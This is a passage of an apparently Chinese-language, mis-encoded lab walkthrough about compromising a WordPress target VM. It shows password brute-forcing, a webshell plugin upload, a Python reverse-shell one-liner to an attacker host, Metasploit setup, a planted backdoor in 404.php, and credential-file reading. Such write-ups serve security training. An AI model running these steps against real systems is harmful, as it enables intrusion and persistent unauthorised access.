href="#7-ä½¿ç”¨Burpsuiteå¯¹è®¿é—®é¡µé¢çš„æµé‡è¿›è¡Œåˆ†æ" class="headerlink" title="7.ä½¿ç”¨Burpsuiteå¯¹è®¿é—®é¡µé¢çš„æµé‡è¿›è¡Œåˆ†æ"></a>7.ä½¿ç”¨Burpsuiteå¯¹è®¿é—®é¡µé¢çš„æµé‡è¿›è¡Œåˆ†æ</h3><p>é…ç½®ä»£ç†â€“OFFâ€“è®¿é—®<a href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a> â€“HTTP history</p><p>å‘ç°åœ¨è®¿é—®<a href="http://10.0.2.11/wordpress/%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%9C%A8%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82%E6%97%B6%E8%BF%98%E4%BC%9A%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80192.168.159.145">http://10.0.2.11/wordpress/çš„è¿‡ç¨‹ä¸­ï¼Œé¡µé¢åœ¨èµ„æºè¯·æ±‚æ—¶è¿˜ä¼šè®¿é—®åœ°å€192.168.159.145</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117103351121.png" alt="image-20211117103351121"></p><p>å¯¹é¡µé¢è¿”å›çš„å“åº”ç»“æœè¿›è¡Œç­›é€‰è¿‡æ»¤192.168.159.145</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117104819274.png" alt="image-20211117104819274"></p><p>å‘ç°å­˜åœ¨é»˜è®¤è®¿é—®è¯¥IPçš„ç¡¬ç¼–ç å†™å…¥</p><p>ä½¿ç”¨Burpsuiteâ€“Proxyâ€“Match and Replaceâ€“Addâ€“é…ç½®</p><p>ä½œç”¨ï¼šå°†å“åº”å¤´éƒ¨ä¸­å’Œå“åº”ä½“å†…çš„192.168.159.145å¼ºåˆ¶æ›¿æ¢ä¸º10.0.2.11</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113559581.png" alt="image-20211117113559581"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113614462.png" alt="image-20211117113614462"></p><p>é‡æ–°è®¿é—®é¡µé¢</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105003629.png" alt="image-20211117105003629"></p><p>å‘ç°è®¿é—®é¡ºç•…è¿…é€Ÿï¼Œä¸”åŠ è½½äº†ä¹‹å‰æ²¡èƒ½åŠ è½½åˆ°çš„å‰ç«¯JSè„šæœ¬ï¼Œå³é¡µé¢åŠ è½½æˆåŠŸã€‚</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117110643947.png" alt="image-20211117110643947"></p><h2 id="äºŒã€æ¼æ´æŒ–æ˜"><a href="#äºŒã€æ¼æ´æŒ–æ˜" class="headerlink" title="äºŒã€æ¼æ´æŒ–æ˜"></a>äºŒã€æ¼æ´æŒ–æ˜</h2><h3 id="1-å¯¹é¡µé¢é‡Œçš„é“¾æ¥å’Œè¡¨å•æäº¤ç­‰ä½ç½®å°è¯•æ£€æµ‹"><a href="#1-å¯¹é¡µé¢é‡Œçš„é“¾æ¥å’Œè¡¨å•æäº¤ç­‰ä½ç½®å°è¯•æ£€æµ‹" class="headerlink" title="1.å¯¹é¡µé¢é‡Œçš„é“¾æ¥å’Œè¡¨å•æäº¤ç­‰ä½ç½®å°è¯•æ£€æµ‹"></a>1.å¯¹é¡µé¢é‡Œçš„é“¾æ¥å’Œè¡¨å•æäº¤ç­‰ä½ç½®å°è¯•æ£€æµ‹</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105845151.png" alt="image-20211117105845151"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117110717572.png" alt="image-20211117110717572"></p><p>å¹¶æœªå‘ç°ç›´æ¥æ¼æ´</p><h3 id="2-å¯¹WordPressç‰ˆæœ¬çš„æ¼æ´è¿›è¡ŒæŸ¥æ‰¾"><a href="#2-å¯¹WordPressç‰ˆæœ¬çš„æ¼æ´è¿›è¡ŒæŸ¥æ‰¾" class="headerlink" title="2.å¯¹WordPressç‰ˆæœ¬çš„æ¼æ´è¿›è¡ŒæŸ¥æ‰¾"></a>2.å¯¹WordPressç‰ˆæœ¬çš„æ¼æ´è¿›è¡ŒæŸ¥æ‰¾</h3><p>å¹¶æœªå‘ç°ç›´æ¥å¯åˆ©ç”¨æ¼æ´ï¼ˆä»£ç æ‰§è¡Œç­‰ï¼‰</p><h3 id="3-è¿”å›æŸ¥çœ‹ç›®å½•æ‰«æç»“æœ"><a href="#3-è¿”å›æŸ¥çœ‹ç›®å½•æ‰«æç»“æœ" class="headerlink" title="3.è¿”å›æŸ¥çœ‹ç›®å½•æ‰«æç»“æœ"></a>3.è¿”å›æŸ¥çœ‹ç›®å½•æ‰«æç»“æœ</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105722251.png" alt="image-20211117105722251"></p><p>å‘ç°ç–‘ä¼¼ç®¡ç†åå°è·¯å¾„ï¼Œå°è¯•è®¿é—®<a href="http://10.0.2.11/wordpress/wp-admin">http://10.0.2.11/wordpress/wp-admin</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113657009.png" alt="image-20211117113657009"></p><p>ç¡®å®æ˜¯WordPressçš„ç®¡ç†åå°ï¼ŒæŸ¥è¯¢è·å¾—WordPressé»˜è®¤è´¦å·ä¸ºadminï¼Œå°è¯•å¼±å£ä»¤åæ— æœ</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113731381.png" alt="image-20211117113731381"></p><h3 id="4-å¯¹ç®¡ç†é¡µé¢è¿›è¡Œå¯†ç çˆ†ç ´"><a href="#4-å¯¹ç®¡ç†é¡µé¢è¿›è¡Œå¯†ç çˆ†ç ´" class="headerlink" title="4.å¯¹ç®¡ç†é¡µé¢è¿›è¡Œå¯†ç çˆ†ç ´"></a>4.å¯¹ç®¡ç†é¡µé¢è¿›è¡Œå¯†ç çˆ†ç ´</h3><p>æ ¹æ®é•¿åº¦ç­›é€‰å‡º è¯·æ±‚å¯†ç ä¸ºadam14æ—¶å‘ç”Ÿäº†é‡å®šå‘</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141137210.png" alt="image-20211117141137210"></p><p>åˆ†æå“åº”å¤´ä¸­ï¼Œé‡å®šå‘åˆ°<a href="http://192.168.159.145/wordpress/wp-admin/">http://192.168.159.145/wordpress/wp-admin/</a></p><p>ä¸”æœ‰æœåŠ¡ç«¯åˆ†é…ç»™è®¿é—®è€…çš„cookie</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141215930.png" alt="image-20211117141215930"></p><p>ç™»å½•WordPressåå°ï¼ŒWordPressç‰ˆæœ¬ä¸º5.7.1</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141334010.png" alt="image-20211117141334010"></p><h3 id="5-WordPressåå°æ¼æ´åˆ©ç”¨"><a href="#5-WordPressåå°æ¼æ´åˆ©ç”¨" class="headerlink" title="5.WordPressåå°æ¼æ´åˆ©ç”¨"></a>5.WordPressåå°æ¼æ´åˆ©ç”¨</h3><h4 id="5-1å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬è¿æ¥èšå‰‘"><a href="#5-1å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬è¿æ¥èšå‰‘" class="headerlink" title="5.1å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬è¿æ¥èšå‰‘"></a>5.1å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬è¿æ¥èšå‰‘</h4><p>Appearanceâ€“Theme Editorâ€“404.php</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141839492.png" alt="image-20211117141839492"></p><p>ä¸Šä¼ å¤±è´¥</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141931382.png" alt="image-20211117141931382"></p><h4 id="5-2åˆ©ç”¨æ’ä»¶ä¸Šä¼ webshell"><a href="#5-2åˆ©ç”¨æ’ä»¶ä¸Šä¼ webshell" class="headerlink" title="5.2åˆ©ç”¨æ’ä»¶ä¸Šä¼ webshell"></a>5.2åˆ©ç”¨æ’ä»¶ä¸Šä¼ webshell</h4><h5 id="5-2-1ä¸Šä¼ å®ç°åå¼¹shellè¿æ¥"><a href="#5-2-1ä¸Šä¼ å®ç°åå¼¹shellè¿æ¥" class="headerlink" title="5.2.1ä¸Šä¼ å®ç°åå¼¹shellè¿æ¥"></a>5.2.1ä¸Šä¼ å®ç°åå¼¹shellè¿æ¥</h5><p>æœ¬åœ°å†™ä¸€ä¸ªç®€å•çš„æ’ä»¶ï¼ˆç¬¦åˆWordPressæ ‡å‡†çš„ï¼‰</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142333540.png" alt="image-20211117142333540"></p><p>Pluginsâ€“Addâ€“Upload Plugins</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142059793.png" alt="image-20211117142059793"></p><p>å¹¶å‹ç¼©ä¸ºå¯ä¸Šä¼ æ ¼å¼</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142554942.png" alt="image-20211117142554942"></p><p>ä¸Šä¼ ã€æ¿€æ´»</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142630478.png" alt="image-20211117142630478"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142653949.png" alt="image-20211117142653949"></p><p>æ’ä»¶é»˜è®¤è·¯å¾„ä¸ºï¼š</p><p><a href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php">http://10.0.2.11/wordpress/wp-content/plugins/shell.php</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142901551.png" alt="image-20211117142901551"></p><p>å°è¯•æ‰§è¡Œidå‘½ä»¤ï¼š</p><p><a href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id">http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143020914.png" alt="image-20211117143020914"></p><p>ç¡®å®šäº†webshellä¸Šä¼ æˆåŠŸï¼Œä¸”å¯æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</p><h5 id="5-2-2-ç¡®è®¤ç›®æ ‡é¶æœºä¸Šå¯åˆ©ç”¨çš„ä¿¡æ¯-x2F-è½¯ä»¶"><a href="#5-2-2-ç¡®è®¤ç›®æ ‡é¶æœºä¸Šå¯åˆ©ç”¨çš„ä¿¡æ¯-x2F-è½¯ä»¶" class="headerlink" title="5.2.2 ç¡®è®¤ç›®æ ‡é¶æœºä¸Šå¯åˆ©ç”¨çš„ä¿¡æ¯&#x2F;è½¯ä»¶"></a>5.2.2 ç¡®è®¤ç›®æ ‡é¶æœºä¸Šå¯åˆ©ç”¨çš„ä¿¡æ¯&#x2F;è½¯ä»¶</h5><h6 id="Kaliç›‘å¬4444ç«¯å£"><a href="#Kaliç›‘å¬4444ç«¯å£" class="headerlink" title="Kaliç›‘å¬4444ç«¯å£"></a>Kaliç›‘å¬4444ç«¯å£</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143051516.png" alt="image-20211117143051516"></p><h6 id="ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰nc"><a href="#ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰nc" class="headerlink" title="ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰nc"></a>ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰nc</h6><p>ï¼ˆå­˜åœ¨ï¼Œä½†æœ¬æ¬¡å°è¯•å…¶ä»–æ–¹æ³•ï¼‰</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143209631.png" alt="image-20211117143209631"></p><h6 id="ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰Pythonç¯å¢ƒ"><a href="#ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰Pythonç¯å¢ƒ" class="headerlink" title="ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰Pythonç¯å¢ƒ"></a>ç¡®å®šç›®æ ‡é¶æœºæ˜¯å¦æœ‰Pythonç¯å¢ƒ</h6><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144310167.png" alt="image-20211117144310167"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144328196.png" alt="image-20211117144328196"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144402379.png" alt="image-20211117144402379"></p><p>ç›®æ ‡é¶æœºå­˜åœ¨Python3ç¯å¢ƒ</p><h5 id="5-2-3ä½¿ç”¨python3åå¼¹shellä»£ç "><a href="#5-2-3ä½¿ç”¨python3åå¼¹shellä»£ç " class="headerlink" title="5.2.3ä½¿ç”¨python3åå¼¹shellä»£ç "></a>5.2.3ä½¿ç”¨python3åå¼¹shellä»£ç </h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145344122.png" alt="image-20211117145344122"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145402436.png" alt="image-20211117145402436"></p><p>ä½¿ç”¨msf å¯»æ‰¾å¯åˆ©ç”¨çš„wordpress exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search wordpress admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144658121.png" alt="image-20211117144658121"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145600950.png" alt="image-20211117145600950"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PASSWORD adam14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 10.0.2.11</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set TARGETURI /wordpress</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145845194.png" alt="image-20211117145845194"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150025521.png" alt="image-20211117150025521"></p><p>ç¼ºç‚¹ï¼šæœ‰äº›å‘½ä»¤ä¸èƒ½æˆåŠŸæ˜¾ç¤º</p><h4 id="5-3å†æ¬¡å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬"><a href="#5-3å†æ¬¡å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="5.3å†æ¬¡å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬"></a>5.3å†æ¬¡å°è¯•åœ¨â€œä¸»é¢˜â€æ’å…¥ä¸€å¥è¯æœ¨é©¬</h4><p>å›é¡¾ä¹‹å‰åœ¨Webé¡µé¢æ’å…¥ä¸€å¥è¯æœ¨é©¬ä¿®æ”¹404.phpæ¨¡æ¿å¤±è´¥ï¼Œé‚£åœ¨ç°å·²ç»è·å¾—å‘½ä»¤è¡Œshellçš„å‰æä¸‹ï¼Œæ˜¯å¦å¯ä»¥å°è¯•æ‰‹åŠ¨çš„æ·»åŠ ä¸€å¥è¯ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd wp-content</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd themes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150443652.png" alt="image-20211117150443652"></p><p>å†ç»“åˆé¡µé¢ä¿¡æ¯ï¼Œç¡®å®šå½“å‰ä¸»é¢˜åä¸ºtwentytwentyoneï¼ˆ404.phpåœ¨å…¶ç›®å½•ä¸‹ï¼‰</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150649101.png" alt="image-20211117150649101"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd twentytwentyone</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117150806467.png" alt="image-20211117150806467"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 404.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117150904611.png" alt="image-20211117150904611"></p><p>è¯•å›¾ç§»åŠ¨å…‰æ ‡å‘ç°webshellåœ¨äº¤äº’è¿‡ç¨‹ä¸­ä»å­˜åœ¨ä¸è¶³</p><p>å‡çº§webshellï¼ˆåªé€‚ç”¨äºbashï¼‰(æ­¤å¤„æ˜¯ç¬¬äºŒæ¬¡å¤ç°æ•´ç†çš„WPæ‰€ä»¥æœªå†æ¬¡é€€å›ç¯å¢ƒé‡æ–°æˆªå›¾ï¼Œè¯·å‚è€ƒä»£ç æ–‡å­—å³å¯)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #è¿”å›ä¹‹å‰çš„è¿æ¥</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p>å› ä¸ºkaliæ˜¯zshï¼Œæ•…è¦åˆ‡æ¢ä¸ºbash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /bin/bash  #ç¡®å®šæ˜¯å¦æœ‰bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh -s /bin/bash #æ›´æ”¹rootç”¨æˆ·</span><br><span class="line">chsh -s /bin/bash #æ›´æ”¹kaliç”¨æˆ·</span><br><span class="line">ï¼ˆæ ¹æ®éœ€è¦é€‰æ‹©ï¼‰</span><br></pre></td></tr></table></figure><p>é‡å¯åè¿›è¡Œç¡®è®¤å¹¶ç›‘å¬</p><p>å‡†å¤‡é‡æ–°è¿æ¥shell</p><p>è¿æ¥æˆåŠŸ</p><p>å‡çº§webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #è¿”å›ä¹‹å‰çš„è¿æ¥</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=screen</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty rows 38 columns 116</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure><p>ï¼ˆå‡çº§æˆåŠŸ å¯Tabè¡¥å…¨ï¼‰è°ƒå°å­—ä½“å</p><p>åœ¨404.phpä¸­å†™å…¥ä¸€å¥è¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117152444377.png" alt="image-20211117152444377"></p><p>ä¿å­˜åæ‰“å¼€èšå‰‘è¿›è¡Œé…ç½®ä»¥ç»´æŒæƒé™ç¨³å®š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell:http://10.0.2.11/wordpress/wp-content/themes/twentytwentyone/404.php</span><br><span class="line"></span><br><span class="line">pwd:aa</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117152943835.png" alt="image-20211117152943835"></p><p>æˆåŠŸè¿æ¥</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153006539.png" alt="image-20211117153006539"></p><h2 id="ä¸‰ã€ææƒ"><a href="#ä¸‰ã€ææƒ" class="headerlink" title="ä¸‰ã€ææƒ"></a>ä¸‰ã€ææƒ</h2><h3 id="1-æŸ¥çœ‹-x2F-etc-x2F-passwd"><a href="#1-æŸ¥çœ‹-x2F-etc-x2F-passwd" class="headerlink" title="1.æŸ¥çœ‹&#x2F;etc&#x2F;passwd"></a>1.æŸ¥çœ‹&#x2F;etc&#x2F;passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153735618.png" alt="image-20211117153735618"></p><h3 id="2-æŸ¥çœ‹ä¸»ç›®å½•æ–‡ä»¶å†…æ˜¯å¦æœ‰è¯¥ç”¨æˆ·"><a href="#2-æŸ¥çœ‹ä¸»ç›®å½•æ–‡ä»¶å†…æ˜¯å¦æœ‰è¯¥ç”¨æˆ·" class="headerlink" title="2.æŸ¥çœ‹ä¸»ç›®å½•æ–‡ä»¶å†…æ˜¯å¦æœ‰è¯¥ç”¨æˆ·"></a>2.æŸ¥çœ‹ä¸»ç›®å½•æ–‡ä»¶å†…æ˜¯å¦æœ‰è¯¥ç”¨æˆ·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home/wpadmin/ -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117153914865.png" alt="image-20211117153914865"></p><p>å‘ç°å­˜åœ¨local.txtæ–‡ä»¶ï¼Œåªæœ‰wpadminç”¨æˆ·å¯¹å…¶æœ‰è¯»çš„æƒé™</p><h3 id="3-æŸ¥çœ‹æ“ä½œç³»ç»Ÿå†…æ ¸"><a href="#3-æŸ¥çœ‹æ“ä½œç³»ç»Ÿå†…æ ¸" class="headerlink" title="3.æŸ¥çœ‹æ“ä½œç³»ç»Ÿå†…æ ¸"></a>3.æŸ¥çœ‹æ“ä½œç³»ç»Ÿå†…æ ¸</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>å¤±è´¥</p><h3 id="4-å°è¯•æŸ¥çœ‹å½“å‰ç”¨æˆ·æœ‰æ²¡æœ‰sudoæƒé™"><a href="#4-å°è¯•æŸ¥çœ‹å½“å‰ç”¨æˆ·æœ‰æ²¡æœ‰sudoæƒé™" class="headerlink" title="4.å°è¯•æŸ¥çœ‹å½“å‰ç”¨æˆ·æœ‰æ²¡æœ‰sudoæƒé™"></a>4.å°è¯•æŸ¥çœ‹å½“å‰ç”¨æˆ·æœ‰æ²¡æœ‰sudoæƒé™</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>å¤±è´¥</p><h3 id="5-æŸ¥çœ‹WordPressçš„é…ç½®æ–‡ä»¶"><a href="#5-æŸ¥çœ‹WordPressçš„é…ç½®æ–‡ä»¶" class="headerlink" title="5.æŸ¥çœ‹WordPressçš„é…ç½®æ–‡ä»¶"></a>5.æŸ¥çœ‹WordPressçš„é…ç½®æ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/wordpress/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154514825.png" alt="image-20211117154514825"></p><h3 id="6-æ˜¯å¦æœ‰å¯†ç å¤ç”¨çš„å¯èƒ½æ€§"><a href="#6-æ˜¯å¦æœ‰å¯†ç å¤ç”¨çš„å¯èƒ½æ€§" class="headerlink" title="6.æ˜¯å¦æœ‰å¯†ç å¤ç”¨çš„å¯èƒ½æ€§?"></a>6.æ˜¯å¦æœ‰å¯†ç å¤ç”¨çš„å¯èƒ½æ€§?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ww-data@wp:/var/www/html/wordpress$ su wpadmin</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154640760.png" alt="image-20211117154640760"></p><p>å¤±è´¥</p><h3 id="7-å°è¯•ç™»å½•æ•°æ®åº“è´¦å·"><a href="#7-å°è¯•ç™»å½•æ•°æ®åº“è´¦å·" class="headerlink" title="7.å°è¯•ç™»å½•æ•°æ®åº“è´¦å·"></a>7.å°è¯•ç™»å½•æ•°æ®åº“è´¦å·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p Wp_Admin#123 -D wordpress</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154804076.png" alt="image-20211117154804076">å¤±è´¥</p><h3 id="8-å°è¯•æ˜¯å¦å¤ç”¨äº†Webé¡µé¢çš„å¯†ç "><a href="#8-å°è¯•æ˜¯å¦å¤ç”¨äº†Webé¡µé¢çš„å¯†ç " class="headerlink" title="8.å°è¯•æ˜¯å¦å¤ç”¨äº†Webé¡µé¢çš„å¯†ç "></a>8.å°è¯•æ˜¯å¦å¤ç”¨äº†Webé¡µé¢çš„å¯†ç </h3><figure class="highlight 